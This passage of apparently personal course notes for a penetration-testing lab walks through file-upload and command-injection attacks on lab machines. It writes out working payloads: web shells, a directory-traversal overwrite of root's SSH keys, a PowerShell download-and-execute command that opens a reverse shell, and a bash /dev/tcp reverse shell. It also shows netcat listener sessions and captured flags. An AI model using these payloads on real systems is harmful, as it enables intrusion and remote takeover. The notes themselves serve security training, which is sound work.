QBuAHQALgBDAGwAbwBzAGUAKAApAA==&amp;quot;
+
+┌──(kali㉿kali)-[~/webshells/ps]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.198] from (UNKNOWN) [192.168.246.189] 55269
+dir
+
+
+    Directory: C:\xampp\htdocs\meteor\uploads
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          5/3/2022   6:21 AM              0 $sock)                                                               
+-a----         8/27/2023  12:52 PM            328 simple-backdoor.pHP                                                  
+
+
+PS C:\xampp\htdocs\meteor\uploads&amp;gt; cat C:\xampp\passwords.txt
+### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+
+2) FileZilla FTP:
+
+   [ You have to create a new user on the FileZilla Interface ] 
+
+3) Mercury (not in the USB &amp;amp; lite version): 
+
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+
+4) WEBDAV: 
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+   For activation please comment out the httpd-dav.conf and
+   following modules in the httpd.conf
+   
+   LoadModule dav_module modules/mod_dav.so
+   LoadModule dav_fs_module modules/mod_dav_fs.so  
+   
+   Please do not forget to refresh the WEBDAV authentification (users and passwords).     
+
+5) SuperPassword (For everything):
+   User: mountainadmin
+   Password: OS{6348c5e6f186a48f11e5347ea7454511}
+   Attention: This user can do everything in our company.. Use with care!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The target VM #2 is running an instance of TinyFileManager. Disable Burp before you start to avoid issues with the web application. Log in to the web application at &lt;a href=&quot;http://192.168.50.16/index.php&quot;&gt;http://192.168.50.16/index.php&lt;/a&gt; with the user admin and password admin@123. Find a way to get code execution by using an uploaded web shell. Display the contents of the /opt/install.txt file to get the flag.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Uploaded webshell through UI
+
+# Started nc listener
+
+nc -nvlp 4444
+
+# Executed web shell by navigating browser to path of shell `http://192.168.246.16/pt-monkey-php-rev-shell.php`
+
+┌──(kali㉿kali)-[~/webshells/php]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.198] from (UNKNOWN) [192.168.246.16] 38374
+Linux d5bbb1188465 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 Linux
+sh: w: not found
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/ # /bin/sh: can&amp;#39;t access tty; job control turned off
+ps
+PID   USER     TIME  COMMAND
+    1 root      0:00 php -S 0.0.0.0:80
+   32 root      0:00 /bin/sh -i
+   35 root      0:00 ps
+/ # sudo -l
+/ # /bin/sh: sudo: not found
+cat /opt/install.txt
+Hello admin team. We needed to reset all passwords to OS{daa29e627253f9e95f252e0edaa425cc}.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6&gt;Using Non-Executable Files&lt;/h6&gt;
+&lt;ul&gt;
+&lt;li&gt;Examine why flaws in file uploads can have severe consequences even if there is no way for an attacker to execute the uploaded files.&lt;/li&gt;
+&lt;li&gt;We may encounter scenarios where we find an unrestricted file upload mechanism, but cannot exploit it.&lt;ul&gt;
+&lt;li&gt;Example for this is Google Drive, where we can upload any file, but cannot leverage it to get system access.&lt;/li&gt;
+&lt;li&gt;In situations such as this, we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Example site no longer uses PHP.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
+404 page not found
+
+kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
+404 page not found
+
+kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
+404 page not found
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Test file upload with &lt;code&gt;test.txt&lt;/code&gt; capture in Burp.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~]
+└─$ sudo nano /etc/hosts
+[sudo] password for kali: 
+                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ echo &amp;quot;test&amp;quot; &amp;gt; test.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Successfully Uploaded File: test.txt&lt;/p&gt;
+&lt;p&gt;Capture in Burp, send to Repeater, and test.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /upload HTTP/1.1
+Host: mountaindesserts.com:8000
+Content-Length: 189
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://mountaindesserts.com:8000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryk5HlB2iMWd4r74v2
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryk5HlB2iMWd4r74v2
+Content-Disposition: form-data; name=&amp;quot;myFile&amp;quot;; filename=&amp;quot;test.txt&amp;quot;
+Content-Type: text/plain
+
+test
+
+------WebKitFormBoundaryk5HlB2iMWd4r74v2--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Same result as browser.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;HTTP/1.1 200 OK
+Date: Sun, 27 Aug 2023 21:20:27 GMT
+Content-Length: 37
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+Successfully Uploaded File: test.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. We can do this by modifying the &amp;quot;filename&amp;quot; parameter in the request so it contains ../../../../../../../test.txt, then click send.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /upload HTTP/1.1
+Host: mountaindesserts.com:8000
+Content-Length: 211
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://mountaindesserts.com:8000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryk5HlB2iMWd4r74v2
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryk5HlB2iMWd4r74v2
+Content-Disposition: form-data; name=&amp;quot;myFile&amp;quot;; filename=&amp;quot;../../../../../../../test.txt&amp;quot;
+Content-Type: text/plain
+
+test
+
+------WebKitFormBoundaryk5HlB2iMWd4r74v2--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Success.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;HTTP/1.1 200 OK
+Date: Sun, 27 Aug 2023 21:24:52 GMT
+Content-Length: 58
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+Successfully Uploaded File: ../../../../../../../test.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;NOTE we have no way of knowing if the server placed the file per the ../ seq or just echoed out filename.&lt;ul&gt;
+&lt;li&gt;Let&amp;#39;s assume relative path was used to place the file.&lt;/li&gt;
+&lt;li&gt;We can attempt to blindly overwrite files.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If our assumption is correct, we can try to blindly overwrite files, which may lead us to system access. We should be aware, that blindly overwriting files in a real-life penetration test could result in lost data or costly downtime of a production system. Before moving forward, let&amp;#39;s briefly review web server accounts and permissions.&lt;/p&gt;
+&lt;p&gt;Web applications using Apache, Nginx or other dedicated web servers often run with specific users, such as www-data on Linux. Traditionally on Windows, the IIS web server runs as a Network Service account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities. These are virtual accounts running web applications grouped by application pools. Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.&lt;/p&gt;
+&lt;p&gt;When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as root or Administrator to avoid any permissions issues. This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.&lt;/p&gt;
+&lt;p&gt;Attempt to overwrite &lt;code&gt;authorized_keys&lt;/code&gt; in the home of root. Create SSH keypair and authorized_keys file containing pub.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~/.ssh]
+└─$ ssh-keygen 
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in fileup
+Your public key has been saved in fileup.pub
+The key fingerprint is:
+SHA256:5fyAdnZ8lhynyVsjsyBrEq4jWUJDKI+NqtSD5ugAGFQ kali@kali
+The key&amp;#39;s randomart image is:
++---[RSA 3072]----+
+| .oE             |
+|o. .             |
+|o=.       .   . .|
+|+.oo     = . o * |
+|+ + .  .S.*.ooO..|
+|o+ + ....oo+.o+o.|
+|B   =  o o  ...  |
+|+. o .. o        |
+|..  ...          |
++----[SHA256]-----+
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/.ssh]
+└─$ cat fileup.pub &amp;gt; ~/authorized_keys 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Prepare the request with burp, upload authorized_keys file and capture. Send to repeater and prepare to blind overwrite.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /upload HTTP/1.1
+Host: mountaindesserts.com:8000
+Content-Length: 768
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://mountaindesserts.com:8000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRHQaNDktHbJ3T2m0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryRHQaNDktHbJ3T2m0
+Content-Disposition: form-data; name=&amp;quot;myFile&amp;quot;; filename=&amp;quot;../../../../../../../root/.ssh/authorized_keys&amp;quot;
+Content-Type: application/octet-stream
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqr0PVNbEyQE/2ObXfuOA/R1A/MXbNLy0uu1ErLnLvauZCPp1OSMsqL6Aji98O9iDW+qXv0N7EOtWhUROggtFQa+E/hadQIHQu/9qfdoqnxXhv7SW8ObAJeTJOgg8Ai4TuwyqKSriDG2hmnTsFRWh2gR1Jzjjdyi8QLPoopARh3cQU/PXGEiHHcOvBjBRf0rMznD9s6UbfrIN0X8GhKCXSdkUwxf3MQhlv6dQAFaXJ9Omg1Vh9yWY+OjfHb7rZhrcnbtgyJE8+G8ckFFXom/iGm4uM7c7GCAOuWYBE5YqItk55d4xHZ+jKCQEDl2GHn1SYQI9lFRItQqdLMIRfbSkn+Tom1oBuiZ5PAIEWuZLnyPLagrPoq2BhPU+8sNRZnd/U3Qmivpa1qLpiHNgLopgf7ZP0qS//bKFWFv26CN87MkkGxfi+C4a3D4DWU2yuGrG5209QVcWJmgQwWmo5lIaXIWSRdEnWMlekBV8LrnIbIYXGE0lfOZ8D9YRIgf7HoWk= kali@kali
+
+------WebKitFormBoundaryRHQaNDktHbJ3T2m0--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Success.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;HTTP/1.1 200 OK
+Date: Sun, 27 Aug 2023 21:36:31 GMT
+Content-Length: 75
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+Successfully Uploaded File: ../../../../../../../root/.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Connect via SSH.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~]
+└─$ ssh -i .ssh/fileup root@mountaindesserts.com -p 2222
+The authenticity of host &amp;#39;[mountaindesserts.com]:2222 ([192.168.246.16]:2222)&amp;#39; can&amp;#39;t be established.
+ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &amp;#39;[mountaindesserts.com]:2222&amp;#39; (ED25519) to the list of known hosts.
+Linux 0e7132f89012 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@0e7132f89012:~# ls
+flag.txt
+root@0e7132f89012:~# cat flag.txt 
+OS{0bc79f04ce6be2821cccba21f60cb644}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5&gt;9.4 Command Injection&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;    Learn about command injection in web applications 
+    ```
+    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;Use operating system commands for OS command injection 
+```
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;    Understand how to leverage command injection to gain system access 
+    ```
+    
+
+#### OS Command Injection
+
+When a well defined API is not implemented and a web app needs to address a large number of cases, developers may accept user input then sanitze it.
+
+- User input accepted
+- filtered for command sequences
+
+Navigate to http://192.168.220.189:8000, the MountainVault site is desinged to clone git repos.
+
+- it allows git commands, but filters `ifconfig`, `ipconfig`, etc.
+- `git help` yeilds valid output, so we may be able to utilize all git commands.
+
+With curl;
+
+```bash
+kali@kali:~$ curl -X POST --data &amp;#39;Archive=ipconfig&amp;#39; http://192.168.50.189:8000/archive
+
+Command Injection detected. Aborting...%!(EXTRA string=ipconfig) 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With Burp, running &lt;code&gt;git version&lt;/code&gt; we find a Win box.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /archive HTTP/1.1
+Host: 192.168.220.189:8000
+Content-Length: 19
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.220.189:8000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.189:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Archive=git+version
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This string is included in Win builds of git when run with &lt;code&gt;version&lt;/code&gt; param.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;HTTP/1.1 200 OK
+Date: Sun, 27 Aug 2023 22:20:58 GMT
+Content-Length: 98
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now that we know it runs Win, poke around.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;seperate multiple commands with &lt;code&gt;;&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;URL encode &lt;code&gt;%3B&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Can also delimit commands with &lt;code&gt;&amp;amp;&lt;/code&gt; and &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; for bash/powershell&lt;ul&gt;
+&lt;li&gt;NOTE Win CMD &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /archive HTTP/1.1
+Host: 192.168.220.189:8000
+Content-Length: 30
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.220.189:8000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.189:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Archive=git+version%3Bipconfig
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Interesting results!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;HTTP/1.1 200 OK
+Date: Sun, 27 Aug 2023 22:23:50 GMT
+Content-Length: 377
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+Repository successfully cloned with command: git version;ipconfig and output: git version 2.36.1.windows.1
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.220.189
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.220.254
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;What we can assume, is the filter checks if &lt;code&gt;git&lt;/code&gt; is executed and little else, leverage it and find out more about the env. This will determine if CMD or PS is exec.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(dir 2&amp;gt;&amp;amp;1 *`|echo CMD);&amp;amp;&amp;lt;# rem #&amp;gt;echo PowerShell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec]
+└─$ urlencode &amp;#39;(dir 2&amp;gt;&amp;amp;1 *`|echo CMD);&amp;amp;&amp;lt;# rem #&amp;gt;echo PowerShell&amp;#39;
+
+%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In Burp;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /archive HTTP/1.1
+Host: 192.168.220.189:8000
+Content-Length: 110
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.220.189:8000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.189:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Archive=git+version%3B%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Retruns;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;HTTP/1.1 200 OK
+Date: Sun, 27 Aug 2023 22:33:38 GMT
+Content-Length: 161
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+Repository successfully cloned with command: git version;(dir 2&amp;gt;&amp;amp;1 *`|echo CMD);&amp;amp;&amp;lt;# rem #&amp;gt;echo PowerShell
+ and output: git version 2.36.1.windows.1
+PowerShell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Looks like PowerShell. Obtain a reverse shell with &lt;code&gt;powercat&lt;/code&gt; , the powershell implementation of netcat included in Kali. Copy it to working dir and serve it with Python.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ ls
+powercat.ps1
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Start the local netcat listener;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec]
+└─$ nc -nvlp 4444                        
+listening on [any] 4444 ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Powercat served and netcat listening, time to inject our command.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;IEX (New-Object System.Net.Webclient).DownloadString(&amp;quot;http://192.168.119.3/powercat.ps1&amp;quot;);powercat -c 192.168.119.3 -p 4444 -e powershell 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;URL encode as usual;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ urlencode &amp;#39;IEX (New-Object System.Net.Webclient).DownloadString(&amp;quot;http://192.168.45.223/powercat.ps1&amp;quot;);powercat -c 192.168.45.223 -p 4444 -e powershell&amp;#39;
+IEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Burp req;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /archive HTTP/1.1
+Host: 192.168.220.189:8000
+Content-Length: 110
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.220.189:8000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.189:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Archive=git+version%3BIEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Netcat shell returned;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec]
+└─$ nc -nvlp 4444                        
+listening on [any] 4444 ...
+connect to [192.168.45.223] from (UNKNOWN) [192.168.220.189] 55266
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\Administrator\Documents\meteor&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Instead of using Powercat, we could also inject a PowerShell reverse shell directly. There are many ways to exploit a command injection vulnerability that depend heavily on the underlying operating system and the implementation of the web application, as well as any security mechanisms in place.&lt;/p&gt;
+&lt;h4&gt;OS Command Injection Exercises&lt;/h4&gt;
+&lt;p&gt;Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec]
+└─$ nc -nvlp 4444                        
+listening on [any] 4444 ...
+connect to [192.168.45.223] from (UNKNOWN) [192.168.220.189] 55266
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\Administrator\Documents\meteor&amp;gt; cd ..\..\Desktop
+cd ..\..\Desktop
+PS C:\Users\Administrator\Desktop&amp;gt; dir
+dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         8/27/2023   3:03 PM             38 secrets.txt                                                          
+
+
+PS C:\Users\Administrator\Desktop&amp;gt; cat secrets.txt
+cat secrets.txt
+OS{f751a1dd339b150229843909b737bcc7}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
+&lt;code&gt;http://192.168.220.16&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Burp captured request, sent to repeater;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /archive HTTP/1.1
+Host: 192.168.220.16
+Content-Length: 19
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.220.16
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.16/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Archive=git+version
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Returns;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;HTTP/1.1 200 OK
+Date: Sun, 27 Aug 2023 23:16:17 GMT
+Content-Length: 88
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+Repository successfully cloned with command: git version and output: git version 2.20.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Looks like Linux host, poke around and break stuff. The one liner;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.119.3/4444 0&amp;gt;&amp;amp;1&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;URL encode, start listener, send request;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/shells]
+└─$ urlencode &amp;#39;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.119.3/4444 0&amp;gt;&amp;amp;1&amp;quot;&amp;#39;
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Burp, add to request with &lt;code&gt;%3B&lt;/code&gt; for &lt;code&gt;;&lt;/code&gt;;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST /archive HTTP/1.1
+Host: 192.168.220.16
+Content-Length: 19
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.220.16
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.16/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Archive=git+version%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Shell returned;&lt;/p&gt;
